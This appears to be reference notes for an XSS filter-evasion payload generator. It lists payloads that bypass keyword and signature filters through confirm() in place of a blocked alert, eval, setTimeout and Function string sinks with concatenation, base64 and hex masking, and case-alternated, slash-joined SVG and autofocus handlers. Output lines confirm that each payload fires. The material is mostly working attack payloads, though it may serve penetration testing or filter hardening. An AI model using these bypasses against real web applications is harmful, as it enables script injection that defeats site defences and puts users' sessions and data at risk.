1. XSS with Disabled Alert and Prompt
- Payload: <script>confirm(1)</script>
- Condition: alert() and prompt() functions are blocked or overridden
- Case: alert and prompt are disabled but confirm and other dialog functions remain available
- Output: <script>confirm(1)</script>

---

2. String-Evaluating Sinks (`eval`/`setTimeout`/`setInterval`/`Function`)
- Payload: `eval("alert(1)")` , `setTimeout("al"+"ert(1)")` , `setInterval(atob("YWxlcnQoMSk="))` , `Function("alert(1)")()` , `eval`alert(1)`` , `eval("al\x65rt(1)")`
- Condition: Every dialog name (`alert`/`confirm`/`prompt`/`print`) is filtered as a bare token but the sink names survive (`eval_name`, `settimeout_name`, `setinterval_name`, `function_name`, `atob` probes); `(` or backtick also needed depending on the arm.
- Case: The argument STRING is executed as JavaScript — keyword filters scanning for a bare `alert(1)` signature miss it inside a string literal. Arms: plain quoted arg (name survives), concat-masked `"al"+"ert(1)"` (name needle never contiguous), `atob("...")` base64 (zero keyword overlap), `\x65` hex escape inside the string, tagged-template `sink`code`` (the strings array stringifies to the same source).
- Output: `setTimeout("alert(1)")` -> FIRED after ~0ms ; `eval("al"+"ert(1)")` -> FIRED

---

3. Case-Mutated Tag/Attribute Junction Breakers
- Payload: `<SvG/{m}/OnLoAd=alert(1)>` , `"/AuToFoCuS/OnFoCuS="{self.onerror=alalertert}throw-1` , `"/AuToFoCuS/OnFoCuS=location="javascript:%61lert%281%29"//{m}`
- Condition: Name atoms (`svg_tag`, `onload`, `autofocus`, `onfocus`) survive individually but the space-separated junction (`pair_svg_onload`, `pair_autofocus_onfocus`) is signed — or the names themselves are signed lowercase-only (`case_*` probes).
- Case: `_alt_case` applies strict odd-position-upper alternation to TAG and ATTRIBUTE names only (HTML names are ASCII case-insensitive; JS bodies and verify markers stay byte-exact). Slash-joining removes the space the junction needle requires. Emitted alongside the lowercase variants — never replaces them.
- Output: `<SvG OnLoAd=alert(1)>` -> FIRED: 1 (Chromium)
